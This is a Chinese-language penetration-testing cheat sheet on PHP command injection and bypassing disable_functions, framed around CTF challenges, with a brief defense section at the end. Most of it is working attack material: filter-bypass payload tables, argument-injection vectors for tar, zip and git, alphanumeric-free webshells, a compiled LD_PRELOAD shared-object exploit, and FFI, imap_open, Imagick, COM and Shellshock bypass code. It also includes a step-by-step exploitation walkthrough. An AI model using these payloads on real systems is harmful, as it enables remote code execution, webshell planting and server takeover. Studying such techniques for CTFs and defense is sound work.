# 命令注入&代码执行-PHP

## 一句话理解
PHP 命令注入的本质，是用户输入进入系统命令执行函数或可间接触发代码执行的危险接口，导致攻击者能够执行系统命令、读写文件、反弹 Shell 或进一步接管主机。

## 常见危害
- 执行任意系统命令
- 读取敏感文件
- 写入 WebShell 或持久化后门
- 下载并执行恶意程序
- 结合提权和横向移动扩大影响

## 常见成因
- 把用户输入直接拼进系统命令
- 错误使用 `system()`、`exec()` 等函数
- 把用户输入传给解释器、脚本引擎、回调函数
- 黑名单过滤不严，被命令分隔符、参数注入或环境差异绕过

## 常见危险函数
### 1. 系统命令执行
- `system()`
- `exec()`
- `shell_exec()`
- `` `cmd` ``
- `passthru()`
- `popen()`
- `proc_open()`

### 2. 代码执行
- `eval()`
- `assert()`
- `preg_replace()` 历史 `/e` 模式
- 动态函数调用
- `call_user_func()`、`call_user_func_array()`

### 3. 文件包含与二次执行
- `include()`
- `require()`
- `create_function()` 历史问题

## 常见利用场景
- Ping、Traceroute、NSLookup 等网络诊断功能
- 图片处理、压缩、备份、转码功能
- 调试接口、计划任务、插件安装
- 后台“执行脚本”“执行命令”类功能
- 调用 `tar`、`ffmpeg`、`convert`、`curl` 等外部命令的业务逻辑

## 利用方式
### 1. 命令拼接注入
如果输入被拼接进 shell 命令，可尝试：
- `;`
- `&&`
- `||`
- `|`
- 换行
- 反引号
- `$()`

### 2. 参数注入
有些场景不能直接闭合命令，但能通过额外参数改变程序行为，例如：
- 写文件
- 读取文件
- 发起网络请求
- 加载配置或脚本

#### 参数注入案例

tar 场景（备份/打包功能，用户输入被拼在 `tar -czf out.tar <input>` 后面）：
```bash
# 注入 GNU tar 的 checkpoint 机制：每处理 1 个文件触发一次动作，exec 即执行命令
evil --checkpoint=1 --checkpoint-action=exec=id
# 完整形式：tar -czf out.tar evil --checkpoint=1 --checkpoint-action=exec=whoami
```

zip 场景（用户输入被拼在 `zip -q -r test.zip <input>` 后面）：
```bash
# -T 对压缩包做完整性测试，-TT 指定测试命令（默认 unzip -t），命令经 shell 执行
zip -q -r test.zip /xxx -T -TT 'id'
```

其他常见向量（同理：不能闭合命令时，追加危险参数改变程序行为）：
```bash
# git：--upload-pack 指定远端打包命令，可注入任意执行
git clone --upload-pack='touch /tmp/pwn' http://target/repo.git
# hg：--config alias.xxx=!cmd 定义别名，! 开头即 shell 命令
hg clone --config alias.clone=!id http://target/repo
```

### 3. 代码执行
如果不是命令执行，而是输入进入 `eval`、动态回调或模板解析，则要按 PHP 代码执行思路构造。

## 实战排查思路
### 1. 先区分是命令执行还是代码执行
关键在于输入最终流向：
- shell 命令
- PHP 解释器
- 文件包含
- 动态回调

### 2. 先找危险函数
审计重点：
- `system`
- `exec`
- `shell_exec`
- `passthru`
- `proc_open`
- `eval`
- `assert`

### 3. 再看输入拼接方式
重点判断：
- 是否进入 shell
- 是否有引号包裹
- 是否经过转义
- 是否可控参数位置

### 4. 最后验证回显能力
区分：
- 直接回显
- 盲命令执行
- 无回显但可出网

## 常见绕过思路
### 1. 分隔符绕过
黑名单若只过滤单个字符，往往可通过其他 shell 语法替代。

完整 payload 表：

| 分隔符 | 说明 | 示例 |
| --- | --- | --- |
| `;` | 顺序执行多条命令 | `ping 127.0.0.1;id` |
| `&&` | 前一条成功才执行下一条 | `ping 127.0.0.1&&id` |
| `\|\|` | 前一条失败才执行下一条 | `ping 1.1.1.1\|\|id` |
| `\|` | 管道，前一条输出作后一条输入 | `ping 127.0.0.1\|id` |
| `%0a` / 换行 | URL 编码换行，另起一行执行新命令 | `ping 127.0.0.1%0aid` |
| 反引号 | 命令替换，结果回填原命令 | `` ping `id` `` |
| `$()` | 命令替换 | `ping $(id)` |

### 2. 空格绕过
常见思路：
- `${IFS}`
- Tab
- 环境变量拼接

完整 payload 表（以 `cat /flag` 为例）：

| Payload | 原理 |
| --- | --- |
| `cat${IFS}/flag` | `$IFS` 默认值为空格+Tab+换行 |
| `cat$IFS$9/flag` | `$9` 为空参数，截断变量名，防止 `$IFS` 与路径粘连 |
| `cat</flag` | 重定向符 `<` 打开文件，不需要空格 |
| `cat%09/flag` | `%09` 即 Tab，URL 传参场景替代空格 |
| `{cat,/flag}` | 大括号展开（bash），逗号自动分隔参数 |
| `cat<>/flag` | 读写重定向方式打开文件 |

### 3. 关键字绕过
- 大小写变形
- 编码变形
- 字符串拼接
- 借助系统已有命令组合实现目标

完整 payload 表（以 `cat /flag` 为例）：

| Payload | 原理 |
| --- | --- |
| `ca\t /flag` | 反斜杠拼接，shell 解析时移除 `\`，等价于 `cat /flag` |
| `ca""t /flag` | 空双引号插入，不影响字符串拼接结果 |
| `ca''t /flag` | 空单引号插入，同上 |
| `c$@at /flag` | `$@` 为空参数，插入单词中等于不存在 |
| `c'a't /flag` | 单引号可拆分在命令的任意位置 |
| `\c\at /flag` | 命令中每个字符前均可加 `\` 转义 |
| `CaT /flag` | 大小写变形：仅 Windows cmd 不区分大小写；Linux 需借助 `tr` 等工具转换 |

### 4. 参数注入替代命令注入
即使不能拼出第二条命令，也可能通过给原命令追加危险参数实现利用。（详见上文「参数注入案例」）

### 5. 编码绕过
当命令关键字或敏感字符串被过滤时，让 shell 自己完成解码：

```bash
# Base64：Y2F0IC9mbGFn 即 "cat /flag"，解码后交给 bash 执行
echo Y2F0IC9mbGFn|base64 -d|bash

# 十六进制：\x63\x61\x74 即 "cat"，echo -e 解释转义输出
echo -e "\x63\x61\x74 /flag"

# printf 命令替换：printf 输出 "cat" 后作为命令执行
$(printf "\x63\x61\x74") /flag
```

| Payload | 原理 |
| --- | --- |
| `echo Y2F0IC9mbGFn\|base64 -d\|bash` | Base64 解码后交给 bash 执行 |
| `echo -e "\x63\x61\x74 /flag"` | `echo -e` 解释 `\x` 十六进制转义 |
| `$(printf "\x63\x61\x74") /flag` | 命令替换，printf 输出 `cat` 作为命令 |

### 6. 绕过 bash 黑名单直接读文件
命令名被禁不等于读不了文件，很多“无害”工具都能输出文件内容：

| Payload | 原理 |
| --- | --- |
| `grep -r flag /` | 递归在所有文件内容中搜 flag |
| `awk '/flag/{print}' /flag` | awk 匹配并打印行 |
| `od -c /flag` | 八进制转储还原文件内容 |
| `xxd /flag` | 十六进制查看 |
| `diff /flag /etc/passwd` | 差异对比顺带输出内容 |
| `more /flag` / `head /flag` / `tail /flag` | 分页/首尾查看 |
| `php -r 'echo file_get_contents("/flag");'` | 目标机存在 php-cli 时可用 |

PHP filter 读源码（存在 `include` 文件包含点时的首选，无需命令执行）：
```
http://target/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### 7. 通配符绕过
`?` 匹配单个字符、`*` 匹配任意长度字符串，由 shell 在文件系统里展开完成匹配，源码中不出现命令关键字：

```bash
/???/????? /????         # 匹配 /bin/cat /flag（路径按目标实际目录调整）
/???/???/???64 ????.???  # 匹配 /usr/bin/base64 flag.php
```

| Payload | 实际等价于 |
| --- | --- |
| `/???/????? /????` | `cat /flag` |
| `/???/???/???64 ????.???` | `/usr/bin/base64 flag.php` |
| `/???/???/???? /???` | `/bin/more /flag`（按目标目录灵活构造） |

### 8. 无字母数字 WebShell
过滤所有字母数字时，利用 PHP 弱类型与字符串运算构造（最短 shell 思想）：

```php
<?php
// PHP5 适用：数组转字符串得到 "Array"，取出 'A'，再通过字符自增拼出任意字母
$_=[];            // 空数组
$_=@"$_";         // 数组转字符串，值为 "Array"
$_=$_['!'=='@'];  // '!'=='@' 为 false，即 $_[0]，得到 'A'
// 从 'A' 出发，利用 $x++ 字符自增依次拼出 ASSERT 与 _POST：
// $__++;$__++;$__++;$__++;  即 'A'->'E'……最终组合出
// assert($_POST[_])，全程源码不含字母数字
?>
```

一句话变体（绕过下划线/超全局变量关键字过滤）：
```php
<?php assert(${'_'.'GET'}['cmd']); ?>
// ${'_'.'GET'} 等价于 $_GET：字符串拼接构造变量名
```

PHP7 取反构造（源码不含字母数字，仅十六进制转义）：
```php
<?php
$_=~"\x8c\x86\x8c\x8b\x9a\x92"; // 按位取反得到 "system"
$_(~"\x8f\x88\x9b");            // system("pwd")
```

## disable_functions 绕过
`disable_functions` 是 php.ini 中的配置项，用于禁用 `system`、`exec` 等危险函数。它只作用于 PHP 语言层的函数调用，拦不住 PHP 解释器底层“启动子进程、加载共享库、调用系统 API”的行为，因此绕过姿势非常多。

注意：`eval` 是语言构造器（language construct）而非函数，写进 disable_functions 无效。

### 1. LD_PRELOAD + mail()（最经典）
**原理**：`mail()` 内部通过 `execve` 启动 `/usr/sbin/sendmail` 子进程。`putenv()` 设置环境变量 `LD_PRELOAD` 指向恶意 .so，子进程加载该 .so 时，其 `__attribute__((constructor))` 修饰的函数在 `main()` 之前执行任意命令——全程不经过 PHP 命令执行函数。
**条件**：
- Linux 环境
- `mail()`（或 `error_log()`）与 `putenv()` 未被禁用
- 可将 .so 与 .php 放到目标可读路径（constructor 方案不依赖系统安装 sendmail）

**步骤与 payload**：

1) 编译恶意 so：
```bash
gcc -shared -fPIC bypass.c -o bypass.so
```

```c
// bypass.c：构造函数在 so 被加载时立即执行，无需劫持特定系统函数
#include <stdlib.h>

__attribute__((constructor))
void preload(void) {
    // 从环境变量读取要执行的命令（由 php 侧 putenv 传入）
    system(getenv("EVIL_CMDLINE"));
}
```

2) 上传 bypass.so 与利用 php 后访问：
```php
<?php
// exp.php：putenv 挂 LD_PRELOAD，mail() 起子进程触发加载
putenv("EVIL_CMDLINE=cat /flag > /var/www/html/out.txt");  // 待执行命令与回显位置
putenv("LD_PRELOAD=/tmp/bypass.so");                       // 恶意 so 绝对路径
mail("", "", "", "");                                      // 触发子进程
?>
```

3) 访问 `http://target/out.txt` 读取结果。

**工具**：https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
（提供现成 bypass_disablefunc.php + x64/x86 so，GET 参数：`?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so`）

### 2. imap_open 注入（CVE-2018-19518）
**原理**：`imap_open()` 内部调用 `rsh/ssh` 连接邮件服务器，mailbox 参数未过滤，可注入 ssh 的 `-oProxyCommand` 选项执行任意命令。
**条件**：启用 imap 扩展（`--with-imap` 编译），且为修复前版本。
```php
<?php
// 利用 ssh ProxyCommand 执行命令，\t（URL 场景 %09）绕过空格过滤
$payload = "echo\t" . base64_encode("cat /flag > /var/www/html/out.txt") . "|base64\t-d|sh";
imap_open('{x -oProxyCommand=' . $payload . '}', '', '');
?>
```

### 3. ImageMagick / Imagick
**原理**（两个方向）：
- 老版本 ImageMagick（CVE-2016-3714 ImageTragick，<= 6.9.3-9 / 7.0.1-1）解析 MSL/SVG/EPHEMERAL 等伪协议时会把内容拼进外部 delegates 命令，直接 RCE；
- 新版本中 Imagick 做图片格式转换时会启动外部进程（如转换为 .wdp 等罕见格式），可作为“启动新进程”的触发器替代 `mail()`，配合 LD_PRELOAD 实现命令执行（0CTF 2019 Wallbreaker Easy 考点）。

**条件**：安装 imagick 扩展；方向一要求 ImageMagick 版本老，方向二要求可上传 so 且 `putenv()` 可用。
```php
<?php
// 方向二：用 Imagick 起外部进程，触发 LD_PRELOAD（替换 mail 的触发角色）
putenv("LD_PRELOAD=/tmp/bypass.so");
putenv("EVIL_CMDLINE=cat /flag > /var/www/html/out.txt");
$a = new Imagick();
$a->readImage('1.png');   // 任一存在的图片
$a->writeImage('1.wdp');  // 目标格式需调用外部转换器
?>
```

### 4. FFI（PHP >= 7.4）
**原理**：FFI（Foreign Function Interface）允许在 PHP 中直接声明并调用 C 库函数，等于绕过函数黑名单直接调用 libc 的 `system`。
**条件**：PHP >= 7.4，php.ini 中 `ffi.enable=true`（仅 INI_SYSTEM 级别生效，无法运行时 `ini_set`）。
```php
<?php
$ffi = FFI::cdef("int system(const char *command);");  // 声明 libc 的 system
$ffi->system("cat /flag > /var/www/html/out.txt");
?>
```

### 5. Windows COM 组件
**原理**：Windows 下通过 COM 对象调用 `WScript.Shell` / `Shell.Application` 执行命令，不经过 PHP 命令执行函数。
**条件**：Windows + 启用 com_dotnet 扩展且 `com.allow_dcom=true`（phpinfo 中可搜到 com.allow_dcom）。
```php
<?php
$com = new COM('WScript.shell');
$com->run('cmd /c whoami > d:\\www\\out.txt', 0);  // 第二参数 0：隐藏窗口
?>
```

### 6. pcntl_exec
**原理**：pcntl 扩展的 `pcntl_exec()` 直接 `execve` 加载外部程序替换当前进程，完全绕开 PHP 函数层黑名单。
**条件**：Linux + 启用 pcntl 扩展且 `pcntl_exec` 未被禁用（php-fpm 场景常未加载 pcntl，CLI 场景常见可用）。
```php
<?php
pcntl_exec("/bin/bash", ["-c", "cat /flag > /var/www/html/out.txt"]);
?>
```

### 7. Bash 破壳漏洞（CVE-2014-6271）
**原理**：bash 解析形如 `BASH_FUNC_x%%=() { :; }; cmd` 的环境变量时，会执行函数定义之后的命令。通过 `putenv()` 注入该环境变量，再借助 `mail()` 等拉起 bash 子进程触发。
**条件**：系统 bash 版本老（< 4.3，2014 年前环境），且调用链中确实会拉起 bash。
```php
<?php
function exp($cmd) {
    putenv("BASH_FUNC_x%%=() { $cmd; };");  // 破壳形式的环境变量
    mail("a@b.com", "", "", "", "");        // 触发子进程
}
exp("cat /flag > /var/www/html/out.txt");
?>
```

### 8. PHP 解释器漏洞（UAF / Bug 系列）
利用 PHP 内核 bug 在用户态篡改执行流直接调用 `system`，无视 disable_functions。集大成工具仓库：

https://github.com/mm0r1/exploits

| Exploit | 适用版本 | 对应 Bug |
| --- | --- | --- |
| php-concat-bypass | PHP 7.3 - 8.1 | bug #81705 |
| php-filter-bypass | PHP 7.0 - 8.0 | bug #54350 |
| php7-backtrace-bypass | PHP 7.0 - 7.4 | bug #76047 |
| php7-gc-bypass | PHP 7.0 - 7.3 | bug #72530（7.4 已修复） |
| php-json-bypass | PHP 7.1 - 7.3 | bug #77843 |

### 9. 适用条件速查表

| 绕过方式 | 系统 | 关键条件 | 依赖函数/扩展 |
| --- | --- | --- | --- |
| LD_PRELOAD + mail | Linux | mail/putenv 未禁用；可上传 so | `mail()`、`putenv()` |
| imap_open 注入 | 任意 | 未修复 CVE-2018-19518 | imap 扩展 |
| ImageMagick/Imagick | 任意 | 版本老（CVE-2016-3714）或可配合 LD_PRELOAD | imagick 扩展 |
| FFI | 任意 | PHP >= 7.4 且 ffi.enable=true | FFI |
| COM 组件 | Windows | com.allow_dcom=true | com_dotnet 扩展 |
| pcntl_exec | Linux | pcntl 扩展已加载且未禁用 | pcntl |
| Bash 破壳 | Linux | bash < 4.3 且调用链拉起 bash | `putenv()` |
| UAF/Bug 系列 | Linux | PHP 版本落在对应区间 | 无（纯用户态利用） |

## 案例：disable_functions CTF 题完整流程
题目背景：目标 `http://target/index.php` 存在代码执行点（如 `eval` 类回调、模板注入、反序列化等，假设已拿到 PHP 代码执行能力），但拿不到 flag——命令执行函数被禁。

### 步骤 1：确认 RCE 并尝试执行命令
```php
// 假设通过 code 参数即可提交任意 PHP 代码
?code=var_dump(system('ls /'));    // 返回 false / 报错
?code=var_dump(shell_exec('id'));  // NULL，命令执行函数全部被禁
```

### 步骤 2：phpinfo 识别禁用函数列表
```php
?code=echo ini_get('disable_functions');
// 输出：system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec
```
若目标本身有 phpinfo 页面，直接搜 `disable_functions` 一行更直观，同时确认三件事：
- PHP 版本（决定能否走 FFI / mm0r1 的 bug 系列）
- `sendmail_path`（默认 `/usr/sbin/sendmail -t -i`，存在则 LD_PRELOAD 有戏）
- `mail`、`putenv` 是否在禁用列表中（本例未禁 → 方向确定为 LD_PRELOAD）

### 步骤 3：部署 LD_PRELOAD 绕过
1) 本地编译恶意 so（见上文 bypass.c），得到 bypass.so；

2) 通过代码执行把 so 写上目标（base64 传输避免二进制问题）：
```php
?code=file_put_contents('/tmp/bypass.so', base64_decode('<bypass.so 的 Base64>'));
```

3) putenv 挂 LD_PRELOAD，mail() 触发执行：
```php
?code=putenv('EVIL_CMDLINE=cat /flag>/var/www/html/out.txt'); putenv('LD_PRELOAD=/tmp/bypass.so'); mail('','','','');
```

### 步骤 4：读 flag
```bash
curl http://target/out.txt
# flag{byp4ss_d1sable_funct10ns_v1a_LD_PRELOAD}
```

### 失败时的备选路径
- `mail()` 被禁 → 换 `error_log()`（同样走 sendmail）或 Imagick 起外部进程作为触发器；
- `putenv()` 被禁 → 依次考虑：FFI（PHP >= 7.4）、mm0r1 的 bug 系列（按 phpinfo 中版本号选 exploit）、Windows COM（仅 Windows）；
- open_basedir 同时开启 → 先绕 open_basedir（glob:// 列目录、symlink 软链跳转）再读 flag。

## 防御要点
### 1. 避免调用系统命令
如果能用语言原生 API 完成，不要起 shell。

### 2. 使用安全参数化调用
如必须调用外部程序，避免字符串拼接，使用参数数组并限制可选值。

### 3. 严格白名单
对命令、参数、路径都做固定映射，不允许用户直接输入完整命令。

### 4. 最小权限
Web 服务账户不应拥有高权限、写系统目录或执行高危程序的能力。

### 5. 关闭危险函数
在可控环境中禁用不必要的高危执行函数。

## 速查清单
- 先找系统命令执行函数和代码执行函数
- 先分清是 shell 注入还是 PHP 代码执行
- 检查是否存在参数注入而非纯命令分隔
- 看是否存在直接回显、时间回显、DNS / HTTP 外带
- 结合文件包含、上传和反序列化评估复合利用链

## Reference
- [PHP 代码命令注入小结](https://www.freebuf.com/column/166385.html)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions](https://www.freebuf.com/web/192052.html)
- [提权之 disable_functions 系列（FreeBuf）](https://www.freebuf.com/articles/web/328815.html)
- [bypass_disablefunc_via_LD_PRELOAD 工具](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)
- [mm0r1/exploits（PHP 7.0-8.1 disable_functions bypass 系列）](https://github.com/mm0r1/exploits)
